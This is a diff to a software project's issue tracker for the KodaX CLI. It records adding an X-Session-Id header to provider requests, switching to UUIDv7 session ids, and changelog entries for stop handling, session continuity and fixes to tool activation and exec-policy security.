+- Resolution Date: 2026-11-17
+- Related: Issue 215, Issue 248, Issue 417, ADR-077
+- Context: customer report against KodaX CLI and Space with a custom provider
+  behind Kodax-Fabric
+
+**Original Problem.** KodaX CLI and Space sent no conversation id on
+provider requests, either for custom providers or for built-in ones. A
+gateway could not group a conversation's requests. Kodax-Fabric reads
+`X-Session-Id` to reconcile usage with KodaX sessions, and opencode-go
+answers 400 when no session header is present. Issue 215's `promptCacheKey`
+is hashed and sent only to providers with cache affinity enabled, so it cannot
+fill this role.
+
+**Resolution.** Every provider HTTP request sends `X-Session-Id` with the
+raw root logical session id. The id travels in run-scoped configuration. Child
+agents, Host workflows, REPL `/compact`, the runner-driven managed task and
+memory review send their root conversation's id. The capability probe sends
+the id of the Run it serves, and outside a Run its own short one. A
+header that is already configured wins. A non-header-safe id is left out.
+New session ids are UUIDv7. Session lists show a timestamp, and short ids show
+the last 8 characters. REPL `/clear` with messages now saves the conversation
+and continues under a new id. A live opencode-go probe succeeded with only
+`X-Session-Id`.
+
+**Files Changed.** LLM `run-scoped-config.ts` and
+`providers/request-extensions.ts`; coding `run-scoped-config.ts`,
+`agent-runtime/run-substrate.ts`, `task-engine/runner-driven.ts`,
+`memory-runtime.ts`, `running-session.ts`, `session-scratch.ts`; Agent
+`session-lineage/session.ts` and `recovery-seed.ts`; REPL `/clear`, `/new`,
+`/compact`, the capability probe, session lists and the picker; root
+`src/sdk-runtime.ts`, `src/runtime-daemon/server.ts` and `src/kodax_cli.ts`.
+
+**Tests Added.**
+- `packages/llm/src/providers/session-header.test.ts` covers the header on
+  each custom-provider protocol (OpenAI, Anthropic, Responses, Mistral, pi
+  messages, Gemini, Bedrock). It also covers no header outside a session, a
+  configured header winning, and unsafe ids being left out.
+- `packages/coding/src/session-header.wire.test.ts` checks the wire header
+  for an explicit id, a generated id (equal to `result.sessionId`), a child
+  agent, and the runner-driven path.
+- Root, daemon, REPL, capability-probe and `/clear` tests check the
+  conversation id on their paths.
+- The CAP-044 contract and the session tests check the UUIDv7 format and
+  ordering.
 
 ### Issue 408: Space SDK image projection, attachment access and approval attribution
 
@@ -9478,6 +10146,8 @@ installed beside the executable.
 - **Fixed**: v0.7.79 development
 - **Created**: 2026-07-31
 - **Resolved**: 2026-07-31
+- **Later change**: since Issue 416 (ADR-077), new ids are UUIDv7. This
+  Issue's uniqueness tests still apply.
 
 #### Original Problem
 
@@ -12010,6 +12680,9 @@ cache properties so reconnecting hosts can distinguish "reported zero" from
 - **Fixed**: v0.7.77 development
 - **Created**: 2026-07-27
 - **Resolved**: 2026-07-27
+- **Later change**: Issue 416 (ADR-077) also sends the raw root session id as
+  `X-Session-Id`, for gateway reconciliation. `promptCacheKey` stays hashed and
+  separate.
 
 #### Original Problem
 
@@ -18706,12 +19379,52 @@ Commit `ef085fc` 把 V1 精简到 V2 时没区分"信息载体"和"脚手架"，
 ---
 
 ## Summary
-- Total: 288 (45 Open, 0 ready, 1 needs-info, 242 Resolved, 0 Partially Resolved, 0 Won't Fix)
-- Ready: 0
+- Total: 300 (48 Open including 1 needs-info, 251 Resolved, 0 Partially Resolved, 0 Won't Fix)
+- Ready: 1 (420)
 - Highest Priority Open: 091 - 缺少一等公民 MCP / Web Search / Code Search 工具体系 (High)
 - Historical archived issues are maintained in ISSUES_ARCHIVED.md
 
 ## Changelog
+
+### 2026-11-20: Issue 422
+
+- Text tools can no longer rewrite a trusted project's Exec Policy when the
+  workspace is reached through a directory alias, and a trusted root now
+  matches its project through an alias. Unreleased.
+
+### 2026-11-20: Issue 421
+
+- On Node 20 and 22 a Stop reaches the provider HTTP stream again: undici
+  dropped the abort after a GC when a fetch used `redirect: 'error'`, so the
+  Run waited for the body timeout and reported a network failure. Managed
+  Runs also stop promptly when a provider ignores its signal. Unreleased.
+
+### 2026-11-19: Issue 419
+
+- Constructed tools and agents load at startup only with a machine-local
+  approval record; a repository can no longer ship an "active" tool that runs
+  on open. Earlier activations need one re-activation; unreleased.
+
+### 2026-11-18: Issue 418
+
+- A2A Tasks in one principal's context continue one Runtime Session, so a
+  follow-up Task sees the earlier exchanges (Issue 418, ADR-077).
+
+### 2026-11-17: Issues 416-417
+
+- Provider requests send `X-Session-Id`, new session ids are UUIDv7 and REPL
+  `/clear` starts a new session (Issue 416, ADR-077). Host `create`/`fork`
+  reject session ids that are not plain portable names (Issue 417).
+
+### 2026-11-17: Issues 412, 413 and 414
+
+- A Stop whose sibling interruption save commits after its deadline now
+  settles instead of failing every retry; Runtime terminal-save failures no
+  longer crash the daemon; unreleased.
+- Issue 413 resolved: an unconfirmed Actor tree now ends the Run `failed`
+  with `effectOutcome: unknown` and fences the Session until repair or
+  restart; `actorSettlementConvergence` is `3`; unreleased.
+- Remaining limits recorded as Issue 414.
 
 ### 2026-11-13: Issue 410
 
